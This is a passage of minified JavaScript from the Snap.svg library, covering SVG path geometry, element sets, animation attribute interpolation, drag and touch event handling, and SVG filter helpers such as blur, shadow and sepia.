p(t,e,i,n,o,r,s,a,l){null==l&&(l=1);for(var d=(l=l>1?1:0>l?0:l)/2,c=[-.1252,.1252,-.3678,.3678,-.5873,.5873,-.7699,.7699,-.9041,.9041,-.9816,.9816],u=[.2491,.2491,.2335,.2335,.2032,.2032,.1601,.1601,.1069,.1069,.0472,.0472],p=0,f=0;12>f;f++){var g=d*c[f]+d,m=h(g,t,i,o,s),v=h(g,e,n,r,a),y=m*m+v*v;p+=u[f]*L.sqrt(y)}return d*p}function f(t,e,i,n,o,r,s,a){if(!(z(t,i)<O(o,s)||O(t,i)>z(o,s)||z(e,n)<O(r,a)||O(e,n)>z(r,a))){var l=(t-i)*(r-a)-(e-n)*(o-s);if(l){var d=((t*n-e*i)*(o-s)-(t-i)*(o*a-r*s))/l,c=((t*n-e*i)*(r-a)-(e-n)*(o*a-r*s))/l,u=+d.toFixed(2),h=+c.toFixed(2);if(!(u<+O(t,i).toFixed(2)||u>+z(t,i).toFixed(2)||u<+O(o,s).toFixed(2)||u>+z(o,s).toFixed(2)||h<+O(e,n).toFixed(2)||h>+z(e,n).toFixed(2)||h<+O(r,a).toFixed(2)||h>+z(r,a).toFixed(2)))return{x:d,y:c}}}}function g(t,e,i){if(!u(d(t),d(e)))return i?0:[];for(var n=~~(p.apply(0,t)/8),o=~~(p.apply(0,e)/8),r=[],s=[],a={},c=i?0:[],h=0;n+1>h;h++){var g=l.apply(0,t.concat(h/n));r.push({x:g.x,y:g.y,t:h/n})}for(h=0;o+1>h;h++)g=l.apply(0,e.concat(h/o)),s.push({x:g.x,y:g.y,t:h/o});for(h=0;n>h;h++)for(var m=0;o>m;m++){var v=r[h],y=r[h+1],b=s[m],x=s[m+1],w=B(y.x-v.x)<.001?"y":"x",k=B(x.x-b.x)<.001?"y":"x",_=f(v.x,v.y,y.x,y.y,b.x,b.y,x.x,x.y);if(_){if(a[_.x.toFixed(4)]==_.y.toFixed(4))continue;a[_.x.toFixed(4)]=_.y.toFixed(4);var C=v.t+B((_[w]-v[w])/(y[w]-v[w]))*(y.t-v.t),S=b.t+B((_[k]-b[k])/(x[k]-b[k]))*(x.t-b.t);C>=0&&1>=C&&S>=0&&1>=S&&(i?c++:c.push({x:_.x,y:_.y,t1:C,t2:S}))}}return c}function m(t,e,i){t=S(t),e=S(e);for(var n,o,r,s,a,l,d,c,u,h,p=i?0:[],f=0,m=t.length;m>f;f++){var v=t[f];if("M"==v[0])n=a=v[1],o=l=v[2];else{"C"==v[0]?(u=[n,o].concat(v.slice(1)),n=u[6],o=u[7]):(u=[n,o,n,o,a,l,a,l],n=a,o=l);for(var y=0,b=e.length;b>y;y++){var x=e[y];if("M"==x[0])r=d=x[1],s=c=x[2];else{"C"==x[0]?(h=[r,s].concat(x.slice(1)),r=h[6],s=h[7]):(h=[r,s,r,s,d,c,d,c],r=d,s=c);var w=g(u,h,i);if(i)p+=w;else{for(var k=0,_=w.length;_>k;k++)w[k].segment1=f,w[k].segment2=y,w[k].bez1=u,w[k].bez2=h;p=p.concat(w)}}}}}return p}function v(t){var e=i(t);if(e.bbox)return I(e.bbox);if(!t)return n();for(var o,r=0,s=0,a=[],l=[],d=0,c=(t=S(t)).length;c>d;d++)if("M"==(o=t[d])[0])r=o[1],s=o[2],a.push(r),l.push(s);else{var u=C(r,s,o[1],o[2],o[3],o[4],o[5],o[6]);a=a.concat(u.min.x,u.max.x),l=l.concat(u.min.y,u.max.y),r=o[5],s=o[6]}var h=O.apply(0,a),p=O.apply(0,l),f=n(h,p,z.apply(0,a)-h,z.apply(0,l)-p);return e.bbox=I(f),f}function y(t,e,i,n,r){if(r)return[["M",+t+ +r,e],["l",i-2*r,0],["a",r,r,0,0,1,r,r],["l",0,n-2*r],["a",r,r,0,0,1,-r,r],["l",2*r-i,0],["a",r,r,0,0,1,-r,-r],["l",0,2*r-n],["a",r,r,0,0,1,r,-r],["z"]];var s=[["M",t,e],["l",i,0],["l",0,n],["l",-i,0],["z"]];return s.toString=o,s}function b(t,e,i,n,r){if(null==r&&null==n&&(n=i),t=+t,e=+e,i=+i,n=+n,null!=r)var s=Math.PI/180,a=t+i*Math.cos(-n*s),l=t+i*Math.cos(-r*s),d=[["M",a,e+i*Math.sin(-n*s)],["A",i,i,0,+(r-n>180),0,l,e+i*Math.sin(-r*s)]];else d=[["M",t,e],["m",0,-n],["a",i,n,0,1,1,0,2*n],["a",i,n,0,1,1,0,-2*n],["z"]];return d.toString=o,d}function x(e){var n=i(e);if(n.abs)return r(n.abs);if(D(e,"array")&&D(e&&e[0],"array")||(e=t.parsePathString(e)),!e||!e.length)return[["M",0,0]];var s,a=[],l=0,d=0,c=0,u=0,h=0;"M"==e[0][0]&&(c=l=+e[0][1],u=d=+e[0][2],h++,a[0]=["M",l,d]);for(var p,f,g=3==e.length&&"M"==e[0][0]&&"R"==e[1][0].toUpperCase()&&"Z"==e[2][0].toUpperCase(),m=h,v=e.length;v>m;m++){if(a.push(p=[]),(s=(f=e[m])[0])!=s.toUpperCase())switch(p[0]=s.toUpperCase(),p[0]){case"A":p[1]=f[1],p[2]=f[2],p[3]=f[3],p[4]=f[4],p[5]=f[5],p[6]=+f[6]+l,p[7]=+f[7]+d;break;case"V":p[1]=+f[1]+d;break;case"H":p[1]=+f[1]+l;break;case"R":for(var y=[l,d].concat(f.slice(1)),x=2,w=y.length;w>x;x++)y[x]=+y[x]+l,y[++x]=+y[x]+d;a.pop(),a=a.concat($(y,g));break;case"O":a.pop(),(y=b(l,d,f[1],f[2])).push(y[0]),a=a.concat(y);break;case"U":a.pop(),a=a.concat(b(l,d,f[1],f[2],f[3])),p=["U"].concat(a[a.length-1].slice(-2));break;case"M":c=+f[1]+l,u=+f[2]+d;default:for(x=1,w=f.length;w>x;x++)p[x]=+f[x]+(x%2?l:d)}else if("R"==s)y=[l,d].concat(f.slice(1)),a.pop(),a=a.concat($(y,g)),p=["R"].concat(f.slice(-2));else if("O"==s)a.pop(),(y=b(l,d,f[1],f[2])).push(y[0]),a=a.concat(y);else if("U"==s)a.pop(),a=a.concat(b(l,d,f[1],f[2],f[3])),p=["U"].concat(a[a.length-1].slice(-2));else for(var k=0,_=f.length;_>k;k++)p[k]=f[k];if("O"!=(s=s.toUpperCase()))switch(p[0]){case"Z":l=+c,d=+u;break;case"H":l=p[1];break;case"V":d=p[1];break;case"M":c=p[p.length-2],u=p[p.length-1];default:l=p[p.length-2],d=p[p.length-1]}}return a.toString=o,n.abs=r(a),a}function w(t,e,i,n){return[t,e,i,n,i,n]}function k(t,e,i,n,o,r){var s=1/3,a=2/3;return[s*t+a*i,s*e+a*n,s*o+a*i,s*r+a*n,o,r]}function _(e,i,n,o,r,s,a,l,d,c){var u,h=120*E/180,p=E/180*(+r||0),f=[],g=t._.cacher((function(t,e,i){return{x:t*L.cos(i)-e*L.sin(i),y:t*L.sin(i)+e*L.cos(i)}}));if(c)S=c[0],$=c[1],k=c[2],C=c[3];else{e=(u=g(e,i,-p)).x,i=u.y,l=(u=g(l,d,-p)).x,d=u.y;var m=(L.cos(E/180*r),L.sin(E/180*r),(e-l)/2),v=(i-d)/2,y=m*m/(n*n)+v*v/(o*o);y>1&&(n*=y=L.sqrt(y),o*=y);var b=n*n,x=o*o,w=(s==a?-1:1)*L.sqrt(B((b*x-b*v*v-x*m*m)/(b*v*v+x*m*m))),k=w*n*v/o+(e+l)/2,C=w*-o*m/n+(i+d)/2,S=L.asin(((i-C)/o).toFixed(9)),$=L.asin(((d-C)/o).toFixed(9));0>(S=k>e?E-S:S)&&(S=2*E+S),0>($=k>l?E-$:$)&&($=2*E+$),a&&S>$&&(S-=2*E),!a&&$>S&&($-=2*E)}var T=$-S;if(B(T)>h){var D=$,I=l,M=d;$=S+h*(a&&$>S?1:-1),f=_(l=k+n*L.cos($),d=C+o*L.sin($),n,o,r,0,a,I,M,[$,D,k,C])}T=$-S;var A=L.cos(S),P=L.sin(S),O=L.cos($),z=L.sin($),N=L.tan(T/4),j=4/3*n*N,F=4/3*o*N,H=[e,i],R=[e+j*P,i-F*A],W=[l+j*z,d-F*O],q=[l,d];if(R[0]=2*H[0]-R[0],R[1]=2*H[1]-R[1],c)return[R,W,q].concat(f);for(var Y=[],U=0,V=(f=[R,W,q].concat(f).join().split(",")).length;V>U;U++)Y[U]=U%2?g(f[U-1],f[U],p).y:g(f[U],f[U+1],p).x;return Y}function C(t,e,i,n,o,r,s,a){for(var l,d,c,u,h,p,f,g,m=[],v=[[],[]],y=0;2>y;++y)if(0==y?(d=6*t-12*i+6*o,l=-3*t+9*i-9*o+3*s,c=3*i-3*t):(d=6*e-12*n+6*r,l=-3*e+9*n-9*r+3*a,c=3*n-3*e),B(l)<1e-12){if(B(d)<1e-12)continue;(u=-c/d)>0&&1>u&&m.push(u)}else f=d*d-4*c*l,g=L.sqrt(f),0>f||((h=(-d+g)/(2*l))>0&&1>h&&m.push(h),(p=(-d-g)/(2*l))>0&&1>p&&m.push(p));for(var b,x=m.length,w=x;x--;)b=1-(u=m[x]),v[0][x]=b*b*b*t+3*b*b*u*i+3*b*u*u*o+u*u*u*s,v[1][x]=b*b*b*e+3*b*b*u*n+3*b*u*u*r+u*u*u*a;return v[0][w]=t,v[1][w]=e,v[0][w+1]=s,v[1][w+1]=a,v[0].length=v[1].length=w+2,{min:{x:O.apply(0,v[0]),y:O.apply(0,v[1])},max:{x:z.apply(0,v[0]),y:z.apply(0,v[1])}}}function S(t,e){var n=!e&&i(t);if(!e&&n.curve)return r(n.curve);for(var o=x(t),s=e&&x(e),a={x:0,y:0,bx:0,by:0,X:0,Y:0,qx:null,qy:null},l={x:0,y:0,bx:0,by:0,X:0,Y:0,qx:null,qy:null},d=function(t,e,i){var n,o;if(!t)return["C",e.x,e.y,e.x,e.y,e.x,e.y];switch(!(t[0]in{T:1,Q:1})&&(e.qx=e.qy=null),t[0]){case"M":e.X=t[1],e.Y=t[2];break;case"A":t=["C"].concat(_.apply(0,[e.x,e.y].concat(t.slice(1))));break;case"S":"C"==i||"S"==i?(n=2*e.x-e.bx,o=2*e.y-e.by):(n=e.x,o=e.y),t=["C",n,o].concat(t.slice(1));break;case"T":"Q"==i||"T"==i?(e.qx=2*e.x-e.qx,e.qy=2*e.y-e.qy):(e.qx=e.x,e.qy=e.y),t=["C"].concat(k(e.x,e.y,e.qx,e.qy,t[1],t[2]));break;case"Q":e.qx=t[1],e.qy=t[2],t=["C"].concat(k(e.x,e.y,t[1],t[2],t[3],t[4]));break;case"L":t=["C"].concat(w(e.x,e.y,t[1],t[2]));break;case"H":t=["C"].concat(w(e.x,e.y,t[1],e.y));break;case"V":t=["C"].concat(w(e.x,e.y,e.x,t[1]));break;case"Z":t=["C"].concat(w(e.x,e.y,e.X,e.Y))}return t},c=function(t,e){if(t[e].length>7){t[e].shift();for(var i=t[e];i.length;)h[e]="A",s&&(p[e]="A"),t.splice(e++,0,["C"].concat(i.splice(0,6)));t.splice(e,1),v=z(o.length,s&&s.length||0)}},u=function(t,e,i,n,r){t&&e&&"M"==t[r][0]&&"M"!=e[r][0]&&(e.splice(r,0,["M",n.x,n.y]),i.bx=0,i.by=0,i.x=t[r][1],i.y=t[r][2],v=z(o.length,s&&s.length||0))},h=[],p=[],f="",g="",m=0,v=z(o.length,s&&s.length||0);v>m;m++){o[m]&&(f=o[m][0]),"C"!=f&&(h[m]=f,m&&(g=h[m-1])),o[m]=d(o[m],a,g),"A"!=h[m]&&"C"==f&&(h[m]="C"),c(o,m),s&&(s[m]&&(f=s[m][0]),"C"!=f&&(p[m]=f,m&&(g=p[m-1])),s[m]=d(s[m],l,g),"A"!=p[m]&&"C"==f&&(p[m]="C"),c(s,m)),u(o,s,a,l,m),u(s,o,l,a,m);var y=o[m],b=s&&s[m],C=y.length,S=s&&b.length;a.x=y[C-2],a.y=y[C-1],a.bx=P(y[C-4])||a.x,a.by=P(y[C-3])||a.y,l.bx=s&&(P(b[S-4])||l.x),l.by=s&&(P(b[S-3])||l.y),l.x=s&&b[S-2],l.y=s&&b[S-1]}return s||(n.curve=r(o)),s?[o,s]:o}function $(t,e){for(var i=[],n=0,o=t.length;o-2*!e>n;n+=2){var r=[{x:+t[n-2],y:+t[n-1]},{x:+t[n],y:+t[n+1]},{x:+t[n+2],y:+t[n+3]},{x:+t[n+4],y:+t[n+5]}];e?n?o-4==n?r[3]={x:+t[0],y:+t[1]}:o-2==n&&(r[2]={x:+t[0],y:+t[1]},r[3]={x:+t[2],y:+t[3]}):r[0]={x:+t[o-2],y:+t[o-1]}:o-4==n?r[3]=r[2]:n||(r[0]={x:+t[n],y:+t[n+1]}),i.push(["C",(-r[0].x+6*r[1].x+r[2].x)/6,(-r[0].y+6*r[1].y+r[2].y)/6,(r[1].x+6*r[2].x-r[3].x)/6,(r[1].y+6*r[2].y-r[3].y)/6,r[2].x,r[2].y])}return i}var T=e.prototype,D=t.is,I=t._.clone,M="hasOwnProperty",A=/,?([a-z]),?/gi,P=parseFloat,L=Math,E=L.PI,O=L.min,z=L.max,N=L.pow,B=L.abs,j=a(1),F=a(),H=a(0,1),R=t._unit2px,W={path:function(t){return t.attr("path")},circle:function(t){var e=R(t);return b(e.cx,e.cy,e.r)},ellipse:function(t){var e=R(t);return b(e.cx||0,e.cy||0,e.rx,e.ry)},rect:function(t){var e=R(t);return y(e.x||0,e.y||0,e.width,e.height,e.rx,e.ry)},image:function(t){var e=R(t);return y(e.x||0,e.y||0,e.width,e.height)},line:function(t){return"M"+[t.attr("x1")||0,t.attr("y1")||0,t.attr("x2"),t.attr("y2")]},polyline:function(t){return"M"+t.attr("points")},polygon:function(t){return"M"+t.attr("points")+"z"},deflt:function(t){var e=t.node.getBBox();return y(e.x,e.y,e.width,e.height)}};t.path=i,t.path.getTotalLength=j,t.path.getPointAtLength=F,t.path.getSubpath=function(t,e,i){if(this.getTotalLength(t)-i<1e-6)return H(t,e).end;var n=H(t,i,1);return e?H(n,e).end:n},T.getTotalLength=function(){return this.node.getTotalLength?this.node.getTotalLength():void 0},T.getPointAtLength=function(t){return F(this.attr("d"),t)},T.getSubpath=function(e,i){return t.path.getSubpath(this.attr("d"),e,i)},t._.box=n,t.path.findDotsAtSegment=l,t.path.bezierBBox=d,t.path.isPointInsideBBox=c,t.closest=function(e,i,o,r){for(var s=100,a=n(e-s/2,i-s/2,s,s),l=[],d=o[0].hasOwnProperty("x")?function(t){return{x:o[t].x,y:o[t].y}}:function(t){return{x:o[t],y:r[t]}},u=0;1e6>=s&&!u;){for(var h=0,p=o.length;p>h;h++){var f=d(h);if(c(a,f.x,f.y)){u++,l.push(f);break}}u||(a=n(e-(s*=2)/2,i-s/2,s,s))}if(1e6!=s){var g,m=1/0;for(h=0,p=l.length;p>h;h++){var v=t.len(e,i,l[h].x,l[h].y);m>v&&(m=v,l[h].len=v,g=l[h])}return g}},t.path.isBBoxIntersect=u,t.path.intersection=function(t,e){return m(t,e)},t.path.intersectionNumber=function(t,e){return m(t,e,1)},t.path.isPointInside=function(t,e,i){var n=v(t);return c(n,e,i)&&m(t,[["M",e,i],["H",n.x2+10]],1)%2==1},t.path.getBBox=v,t.path.get=W,t.path.toRelative=function(e){var n=i(e),s=String.prototype.toLowerCase;if(n.rel)return r(n.rel);t.is(e,"array")&&t.is(e&&e[0],"array")||(e=t.parsePathString(e));var a=[],l=0,d=0,c=0,u=0,h=0;"M"==e[0][0]&&(c=l=e[0][1],u=d=e[0][2],h++,a.push(["M",l,d]));for(var p=h,f=e.length;f>p;p++){var g=a[p]=[],m=e[p];if(m[0]!=s.call(m[0]))switch(g[0]=s.call(m[0]),g[0]){case"a":g[1]=m[1],g[2]=m[2],g[3]=m[3],g[4]=m[4],g[5]=m[5],g[6]=+(m[6]-l).toFixed(3),g[7]=+(m[7]-d).toFixed(3);break;case"v":g[1]=+(m[1]-d).toFixed(3);break;case"m":c=m[1],u=m[2];default:for(var v=1,y=m.length;y>v;v++)g[v]=+(m[v]-(v%2?l:d)).toFixed(3)}else{g=a[p]=[],"m"==m[0]&&(c=m[1]+l,u=m[2]+d);for(var b=0,x=m.length;x>b;b++)a[p][b]=m[b]}var w=a[p].length;switch(a[p][0]){case"z":l=c,d=u;break;case"h":l+=+a[p][w-1];break;case"v":d+=+a[p][w-1];break;default:l+=+a[p][w-2],d+=+a[p][w-1]}}return a.toString=o,n.rel=r(a),a},t.path.toAbsolute=x,t.path.toCubic=S,t.path.map=function(t,e){if(!e)return t;var i,n,o,r,s,a,l;for(o=0,s=(t=S(t)).length;s>o;o++)for(r=1,a=(l=t[o]).length;a>r;r+=2)i=e.x(l[r],l[r+1]),n=e.y(l[r],l[r+1]),l[r]=i,l[r+1]=n;return t},t.path.toString=o,t.path.clone=r})),n.plugin((function(t){var n=Math.max,o=Math.min,r=function(t){if(this.items=[],this.bindings={},this.length=0,this.type="set",t)for(var e=0,i=t.length;i>e;e++)t[e]&&(this[this.items.length]=this.items[this.items.length]=t[e],this.length++)},s=r.prototype;s.push=function(){for(var t,e,i=0,n=arguments.length;n>i;i++)(t=arguments[i])&&(this[e=this.items.length]=this.items[e]=t,this.length++);return this},s.pop=function(){return this.length&&delete this[this.length--],this.items.pop()},s.forEach=function(t,e){for(var i=0,n=this.items.length;n>i;i++)if(!1===t.call(e,this.items[i],i))return this;return this},s.animate=function(n,o,r,s){"function"!=typeof r||r.length||(s=r,r=i.linear),n instanceof t._.Animation&&(s=n.callback,r=n.easing,o=r.dur,n=n.attr);var a=arguments;if(t.is(n,"array")&&t.is(a[a.length-1],"array"))var l=!0;var d,c=function(){d?this.b=d:d=this.b},u=0,h=this,p=s&&function(){++u==h.length&&s.call(this)};return this.forEach((function(t,i){e.once("snap.animcreated."+t.id,c),l?a[i]&&t.animate.apply(t,a[i]):t.animate(n,o,r,p)}))},s.remove=function(){for(;this.length;)this.pop().remove();return this},s.bind=function(t,e,i){var n={};if("function"==typeof e)this.bindings[t]=e;else{var o=i||t;this.bindings[t]=function(t){n[o]=t,e.attr(n)}}return this},s.attr=function(t){var e={};for(var i in t)this.bindings[i]?this.bindings[i](t[i]):e[i]=t[i];for(var n=0,o=this.items.length;o>n;n++)this.items[n].attr(e);return this},s.clear=function(){for(;this.length;)this.pop()},s.splice=function(t,e){t=0>t?n(this.length+t,0):t,e=n(0,o(this.length-t,e));var i,s=[],a=[],l=[];for(i=2;i<arguments.length;i++)l.push(arguments[i]);for(i=0;e>i;i++)a.push(this[t+i]);for(;i<this.length-t;i++)s.push(this[t+i]);var d=l.length;for(i=0;i<d+s.length;i++)this.items[t+i]=this[t+i]=d>i?l[i]:s[i-d];for(i=this.items.length=this.length-=e-d;this[i];)delete this[i++];return new r(a)},s.exclude=function(t){for(var e=0,i=this.length;i>e;e++)if(this[e]==t)return this.splice(e,1),!0;return!1},s.insertAfter=function(t){for(var e=this.items.length;e--;)this.items[e].insertAfter(t);return this},s.getBBox=function(){for(var t=[],e=[],i=[],r=[],s=this.items.length;s--;)if(!this.items[s].removed){var a=this.items[s].getBBox();t.push(a.x),e.push(a.y),i.push(a.x+a.width),r.push(a.y+a.height)}return{x:t=o.apply(0,t),y:e=o.apply(0,e),x2:i=n.apply(0,i),y2:r=n.apply(0,r),width:i-t,height:r-e,cx:t+(i-t)/2,cy:e+(r-e)/2}},s.clone=function(t){t=new r;for(var e=0,i=this.items.length;i>e;e++)t.push(this.items[e].clone());return t},s.toString=function(){return"Snap‘s set"},s.type="set",t.Set=r,t.set=function(){var t=new r;return arguments.length&&t.push.apply(t,Array.prototype.slice.call(arguments,0)),t}})),n.plugin((function(t,i){function n(t){var e=t[0];switch(e.toLowerCase()){case"t":return[e,0,0];case"m":return[e,1,0,0,1,0,0];case"r":return 4==t.length?[e,0,t[2],t[3]]:[e,0];case"s":return 5==t.length?[e,1,1,t[3],t[4]]:3==t.length?[e,1,1]:[e,1]}}function o(e,i,o){i=f(i).replace(/\.{3}|\u2026/g,e),e=t.parseTransformString(e)||[],i=t.parseTransformString(i)||[];for(var r,s,a,l,u=Math.max(e.length,i.length),h=[],p=[],g=0;u>g;g++){if(a=e[g]||n(i[g]),l=i[g]||n(a),a[0]!=l[0]||"r"==a[0].toLowerCase()&&(a[2]!=l[2]||a[3]!=l[3])||"s"==a[0].toLowerCase()&&(a[3]!=l[3]||a[4]!=l[4])){e=t._.transform2matrix(e,o()),i=t._.transform2matrix(i,o()),h=[["m",e.a,e.b,e.c,e.d,e.e,e.f]],p=[["m",i.a,i.b,i.c,i.d,i.e,i.f]];break}for(h[g]=[],p[g]=[],r=0,s=Math.max(a.length,l.length);s>r;r++)r in a&&(h[g][r]=a[r]),r in l&&(p[g][r]=l[r])}return{from:c(h),to:c(p),f:d(h)}}function r(t){return t}function s(t){return function(e){return+e.toFixed(3)+t}}function a(t){return t.join(" ")}function l(e){return t.rgb(e[0],e[1],e[2])}function d(t){var e,i,n,o,r,s,a=0,l=[];for(e=0,i=t.length;i>e;e++){for(r="[",s=['"'+t[e][0]+'"'],n=1,o=t[e].length;o>n;n++)s[n]="val["+a+++"]";r+=s+"]",l[e]=r}return Function("val","return Snap.path.toString.call(["+l+"])")}function c(t){for(var e=[],i=0,n=t.length;n>i;i++)for(var o=1,r=t[i].length;r>o;o++)e.push(t[i][o]);return e}function u(t){return isFinite(parseFloat(t))}var h={},p=/[a-z]+$/i,f=String;h.stroke=h.fill="colour",i.prototype.equal=function(t,i){return e("snap.util.equal",this,t,i).firstDefined()},e.on("snap.util.equal",(function(e,i){var n,g,m=f(this.attr(e)||""),v=this;if(u(m)&&u(i))return{from:parseFloat(m),to:parseFloat(i),f:r};if("colour"==h[e])return n=t.color(m),g=t.color(i),{from:[n.r,n.g,n.b,n.opacity],to:[g.r,g.g,g.b,g.opacity],f:l};if("viewBox"==e)return{from:n=this.attr(e).vb.split(" ").map(Number),to:g=i.split(" ").map(Number),f:a};if("transform"==e||"gradientTransform"==e||"patternTransform"==e)return i instanceof t.Matrix&&(i=i.toTransformString()),t._.rgTransform.test(i)||(i=t._.svgTransform2string(i)),o(m,i,(function(){return v.getBBox(1)}));if("d"==e||"path"==e)return{from:c((n=t.path.toCubic(m,i))[0]),to:c(n[1]),f:d(n[0])};if("points"==e)return{from:n=f(m).split(t._.separator),to:g=f(i).split(t._.separator),f:function(t){return t}};var y=m.match(p),b=f(i).match(p);return y&&function(e,i){return!(!t.is(e,"array")||!t.is(i,"array"))&&e.toString()==i.toString()}(y,b)?{from:parseFloat(m),to:parseFloat(i),f:s(y)}:{from:this.asPX(e),to:this.asPX(e,i),f:r}}))})),n.plugin((function(t,i,n,o){for(var r=i.prototype,s=("createTouch"in o.doc),a=["click","dblclick","mousedown","mousemove","mouseout","mouseover","mouseup","touchstart","touchmove","touchend","touchcancel"],l={mousedown:"touchstart",mousemove:"touchmove",mouseup:"touchend"},d=function(t,e){var i="y"==t?"scrollTop":"scrollLeft",n=e&&e.node?e.node.ownerDocument:o.doc;return n[i in n.documentElement?"documentElement":"body"][i]},c=function(){return this.originalEvent.preventDefault()},u=function(){return this.originalEvent.stopPropagation()},h=function(t,e,i,n){var o=s&&l[e]?l[e]:e,r=function(o){var r=d("y",n),a=d("x",n);if(s&&l.hasOwnProperty(e))for(var h=0,p=o.targetTouches&&o.targetTouches.length;p>h;h++)if(o.targetTouches[h].target==t||t.contains(o.targetTouches[h].target)){var f=o;(o=o.targetTouches[h]).originalEvent=f,o.preventDefault=c,o.stopPropagation=u;break}var g=o.clientX+a,m=o.clientY+r;return i.call(n,o,g,m)};return e!==o&&t.addEventListener(e,r,!1),t.addEventListener(o,r,!1),function(){return e!==o&&t.removeEventListener(e,r,!1),t.removeEventListener(o,r,!1),!0}},p=[],f=function(t){for(var i,n=t.clientX,o=t.clientY,r=d("y"),a=d("x"),l=p.length;l--;){if(i=p[l],s){for(var c,u=t.touches&&t.touches.length;u--;)if((c=t.touches[u]).identifier==i.el._drag.id||i.el.node.contains(c.target)){n=c.clientX,o=c.clientY,(t.originalEvent?t.originalEvent:t).preventDefault();break}}else t.preventDefault();var h=i.el.node;h.nextSibling,h.parentNode,h.style.display,n+=a,o+=r,e("snap.drag.move."+i.el.id,i.move_scope||i.el,n-i.el._drag.x,o-i.el._drag.y,n,o,t)}},g=function(i){t.unmousemove(f).unmouseup(g);for(var n,o=p.length;o--;)(n=p[o]).el._drag={},e("snap.drag.end."+n.el.id,n.end_scope||n.start_scope||n.move_scope||n.el,i),e.off("snap.drag.*."+n.el.id);p=[]},m=a.length;m--;)!function(e){t[e]=r[e]=function(i,n){if(t.is(i,"function"))this.events=this.events||[],this.events.push({name:e,f:i,unbind:h(this.node||document,e,i,n||this)});else for(var o=0,r=this.events.length;r>o;o++)if(this.events[o].name==e)try{this.events[o].f.call(this)}catch(t){}return this},t["un"+e]=r["un"+e]=function(t){for(var i=this.events||[],n=i.length;n--;)if(i[n].name==e&&(i[n].f==t||!t))return i[n].unbind(),i.splice(n,1),!i.length&&delete this.events,this;return this}}(a[m]);r.hover=function(t,e,i,n){return this.mouseover(t,i).mouseout(e,n||i)},r.unhover=function(t,e){return this.unmouseover(t).unmouseout(e)};var v=[];r.drag=function(i,n,o,r,s,a){function l(l,d,c){(l.originalEvent||l).preventDefault(),u._drag.x=d,u._drag.y=c,u._drag.id=l.identifier,!p.length&&t.mousemove(f).mouseup(g),p.push({el:u,move_scope:r,start_scope:s,end_scope:a}),n&&e.on("snap.drag.start."+u.id,n),i&&e.on("snap.drag.move."+u.id,i),o&&e.on("snap.drag.end."+u.id,o),e("snap.drag.start."+u.id,s||r||u,d,c,l)}function d(t,i,n){e("snap.draginit."+u.id,u,t,i,n)}var c,u=this;return arguments.length?(e.on("snap.draginit."+u.id,l),u._drag={},v.push({el:u,start:l,init:d}),u.mousedown(d),u):u.drag((function(t,e){this.attr({transform:c+(c?"T":"t")+[t,e]})}),(function(){c=this.transform().local}))},r.undrag=function(){for(var i=v.length;i--;)v[i].el==this&&(this.unmousedown(v[i].init),v.splice(i,1),e.unbind("snap.drag.*."+this.id),e.unbind("snap.draginit."+this.id));return!v.length&&t.unmousemove(f).unmouseup(g),this}})),n.plugin((function(t,i,n){var o=(i.prototype,n.prototype),r=/^\s*url\((.+)\)/,s=String,a=t._.$;t.filter={},o.filter=function(e){var n=this;"svg"!=n.type&&(n=n.paper);var o=t.parse(s(e)),r=t._.id(),l=(n.node.offsetWidth,n.node.offsetHeight,a("filter"));return a(l,{id:r,filterUnits:"userSpaceOnUse"}),l.appendChild(o.node),n.defs.appendChild(l),new i(l)},e.on("snap.util.getattr.filter",(function(){e.stop();var i=a(this.node,"filter");if(i){var n=s(i).match(r);return n&&t.select(n[1])}})),e.on("snap.util.attr.filter",(function(n){if(n instanceof i&&"filter"==n.type){e.stop();var o=n.node.id;o||(a(n.node,{id:n.id}),o=n.id),a(this.node,{filter:t.url(o)})}n&&"none"!=n||(e.stop(),this.node.removeAttribute("filter"))})),t.filter.blur=function(e,i){null==e&&(e=2);var n=null==i?e:[e,i];return t.format('<feGaussianBlur stdDeviation="{def}"/>',{def:n})},t.filter.blur.toString=function(){return this()},t.filter.shadow=function(e,i,n,o,r){return"string"==typeof n&&(r=o=n,n=4),"string"!=typeof o&&(r=o,o="#000"),o=o||"#000",null==n&&(n=4),null==r&&(r=1),null==e&&(e=0,i=2),null==i&&(i=e),o=t.color(o),t.format('<feGaussianBlur in="SourceAlpha" stdDeviation="{blur}"/><feOffset dx="{dx}" dy="{dy}" result="offsetblur"/><feFlood flood-color="{color}"/><feComposite in2="offsetblur" operator="in"/><feComponentTransfer><feFuncA type="linear" slope="{opacity}"/></feComponentTransfer><feMerge><feMergeNode/><feMergeNode in="SourceGraphic"/></feMerge>',{color:o,dx:e,dy:i,blur:n,opacity:r})},t.filter.shadow.toString=function(){return this()},t.filter.grayscale=function(e){return null==e&&(e=1),t.format('<feColorMatrix type="matrix" values="{a} {b} {c} 0 0 {d} {e} {f} 0 0 {g} {b} {h} 0 0 0 0 0 1 0"/>',{a:.2126+.7874*(1-e),b:.7152-.7152*(1-e),c:.0722-.0722*(1-e),d:.2126-.2126*(1-e),e:.7152+.2848*(1-e),f:.0722-.0722*(1-e),g:.2126-.2126*(1-e),h:.0722+.9278*(1-e)})},t.filter.grayscale.toString=function(){return this()},t.filter.sepia=function(e){return null==e&&(e=1),t.format('<feColorMatrix type="matrix" values="{a} {b} {c} 0 0 {d} {e} {f} 0 0 {g} {h} {i} 0 0 0 0 0 1 0"/>',{a:.393+.607*(1-e),b:.769-.769*(1-e),c:.189-.189*(1-e),d:.349-.349*(1-e),e:.686+.314*(1-e),f:.168-.168*(1-e),g:.272-.272*(1-e),h:.534-.534*(1-e),i:.131+.869*(1-e)})},t.filter.sepia.toString=function(){return this()},t.filter.saturate=function(e){return null==e&&(e=1),t.format('<feColorMatrix type="saturate" values="{amount}"/>',{amount:1-e})},t.filter.saturate.toString=function(){return this()},t.filter.hueRotate=function(e){return e=e||0,t.format('<feColorMatrix type="hueRotate" values="{angle}"/>',{angle:e})},t.filter.hueRotate.toString=function(){return this()},t.filter.invert=function(e){return null==e&&(e=1),t.format('<feComponentTransfer><feFuncR type="table" tableValues="{amount} {amount2}"/><feFuncG type="table" tableValues="{amount} {amount2}"/><feFuncB type="table" tableValues="{amount} {amount2}"/></feComponentTransfer>',{amount:e,amount2:1-e})},t.filter.invert.toString=function(){return this()},t.filter.brightness=function(e){return null==e&&(e=1),t.format('<feComponentTransfer><feFuncR type="linear" slope="{amount}"/><feFuncG type="linear" slope="{amount}"/><feFuncB type="linear" slope="{amount}"/></feComponentTransfer>',{amount:e})},t.filter.brightness.toString=function(){return this()},t.filter.contrast=function(e){return null==e&&(e=1),t.format('<feComponentTransfer><feFuncR type="linear" slope="{amount}" 